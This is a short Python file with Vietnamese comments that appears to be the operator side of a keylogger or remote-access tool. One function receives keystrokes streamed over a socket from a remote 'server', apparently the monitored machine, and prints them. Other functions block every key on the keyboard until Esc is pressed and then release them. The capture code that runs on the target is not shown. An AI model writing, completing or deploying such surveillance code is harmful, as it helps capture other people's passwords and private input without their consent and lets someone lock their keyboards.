import keyboard

def receive_key_loggers(client_socket):
    """Nhận và in các phím nhấn từ server."""
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(data, end='', flush=True)  # In ra phím nhấn
        except ConnectionResetError:
            print("Server disconnected.")
            break

def start_keylogger(client_socket):
    """Khởi động keylogger."""
    print("Khởi động keylogger...")
    # Bắt đầu ghi nhận phím nhấn
    receive_key_loggers(client_socket)

def block_keys():
    """Khóa tất cả các phím trừ phím Esc để tắt chế độ khóa."""
    for key in keyboard.all_modifiers + keyboard.all_normal_keys:
        keyboard.block_key(key)
    print("Bàn phím đã bị khóa. Nhấn 'Esc' để tắt chế độ khóa.")
    keyboard.wait('esc')
    unblock_keys()

def unblock_keys():
    """Mở khóa tất cả các phím."""
    for key in keyboard.all_modifiers + keyboard.all_normal_keys:
        keyboard.unblock_key(key)
    print("Bàn phím đã được mở khóa.")
